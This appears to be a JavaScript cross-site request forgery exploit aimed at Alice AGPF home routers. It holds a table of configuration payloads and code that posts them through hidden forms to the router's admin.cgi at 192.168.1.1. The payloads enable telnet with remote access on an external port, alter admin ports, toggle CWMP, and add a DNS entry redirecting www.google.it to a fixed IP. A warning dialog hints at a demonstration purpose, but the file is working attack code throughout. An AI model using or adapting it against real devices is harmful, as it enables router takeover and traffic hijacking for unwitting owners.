

stack_set_parameters = {
		
	'verify' : "(set\
  (0\
    (path(manufacturer/hardware/serial_num))\
    	(set(serial_num(ROUTER VULNERABILE)))\
  )\
)",


	'http_port' : "(set\
  (0\
    (path(admin/https/ports/0/port))\
    	(set(port(80)))\
  )\
)",


	'telnet_enable' : "(set\
  (0\
    (path(admin/telnets/disabled))\
    	(set(disabled(0)))\
  )\
)",

	'telnet_disable' : "(set\
  (0\
    (path(admin/telnets/disabled))\
    	(set(disabled(1)))\
  )\
)",

	'menu_enable' : "(set\
  (0\
    (path(wbm/admin_on))\
        (set(admin_on(1)))\
  )\
)",
	'menu_disable' : "(set\
  (0\
    (path(wbm/admin_on))\
        (set(admin_on(0)))\
  )\
)",

	'dns_append' : "(stack_set\n\
  (0\n\
    (path(dns/entry))\n\
    (index(-1))\n\
    (set\n\
      (-1\n\
        (ip(109.168.126.241))\n\
        (hostname(www.google.it))\n\
      )\n\
    )\n\
  )\n\
)\n",

	'telnet_external' : "(stack_set\n\
  (0\n\
    (path(admin/telnets/ports))\n\
    (index(-1))\n\
    (set\n\
      (-1\n\
        (port(23322))\n\
        (ssl_mode(none))\n\
        (remote_access(1))\n\
      )\n\
    )\n\
  )\n\
)\n",

	'cwmp_enable' : "(set\
  (0\
    (path(cwmp/enabled))\
        (set(enabled(1)))\
  )\
)",

	'cwmp_disable' : "(set\
  (0\
    (path(cwmp/enabled))\
        (set(enabled(0)))\
  )\
)"

}



function post_to_url(path, params, active_page, target, method) {
    method = method || "post"; 

    params['active_page'] = active_page;

    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);
    form.setAttribute("target", target);

    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "hidden");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
         }
    }

    document.body.appendChild(form);
    form.submit();
    console.log(JSON.stringify(params));
}

function confirm_cross_requests(aspect, stack_set, active_pages, warning_message) {

	warning_message	= warning_message || "This function could compromise your router. Would you continue?";
	confirm(warning_message) && do_cross_requests(aspect,stack_set,active_pages);

}

function do_cross_requests(aspect, stack_set, active_pages) {
	if(stack_set_parameters[aspect] == undefined) 
		return;

        stack_set = stack_set || stack_set_parameters[aspect]; 

	if(active_pages == undefined || !(active_pages instanceof Array))
		active_pages = [ "9115", "9130", "9132", "9114" ];

	// 9115 = AGPF_4.3.5a; 9130 = AGPF_4.5.0sx?; 9132 = AGPF_4.6.2
	// 9114 = AGPWI_1.0.3

	params = {};
	params["stack_set"]=stack_set;
	params["page_title"]="Alice - Info";
	params["mimic_button_field"]="submit_button_avanti: avanti..";
	params["button_value"]="attiva";
	params["strip_page_top"]="0";


	var delay = 0;
	for (var page in active_pages) {
		
		active_page = active_pages[page];
		setTimeout(function(active_page) { return function() { post_to_url("http://192.168.1.1/admin.cgi", params, active_page, "hiddenframe"); } }(active_page), delay);
		delay+=1000;


	}

}

function get_validated_value(aspect, str_to_replace, element_id, re_validator) {

	aspect_str = stack_set_parameters[aspect];	
        if(aspect_str == undefined) {
		throw('Aspect ' + aspect + ' not found.');
	}
	
	if(aspect_str.indexOf(str_to_replace) == -1) {
		throw('String to replace "' + str_to_replace + '" not found in "' + aspect_str + '".');
	}

	element_value = document.getElementById(element_id).value;
        if(element_value == null) {
                throw('Element ' + element_value + ' not found.');
        }
	
	if(!(re_validator instanceof RegExp)) {
                throw('Error, wrong regexp.');
	}

	if(!element_value.match(re_validator)) {

		error_msg = 'Error matching "' + re_validator + '" in "' + element_value + '", retry with correct value.';
                alert(error_msg);
                throw(error_msg);
	}

	return aspect_str.replace(str_to_replace, element_value);
}

